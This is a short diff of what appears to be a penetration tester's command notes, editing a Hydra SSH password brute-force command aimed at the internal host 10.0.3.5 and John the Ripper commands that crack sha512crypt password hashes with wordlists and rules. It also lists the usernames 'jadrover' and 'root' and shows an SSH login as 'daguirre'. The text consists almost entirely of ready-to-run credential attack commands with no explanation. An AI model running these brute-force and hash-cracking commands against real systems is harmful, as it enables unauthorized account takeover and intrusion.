@@ -24,7 +24,7 @@ hydra -L users.txt -P passwords_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o
 ssh daguirre@10.0.3.5
 
 
-hydra -L users.txt -P passwords_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
+hydra -L users.txt -P passwords_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt
 jadrover
 root
 
@@ -37,7 +37,7 @@ john --format=sha512crypt --wordlist=fing_ultimate.txt --rules=Jumbo users.txt
 
 
 
-john --wordlist=dict.txt --rules=wordlist --format=sha512crypt --fork=4 usuarios.txt
+john --wordlist=dic.txt --rules=wordlist --format=sha512crypt --fork=4 hash.txt
 
 
 
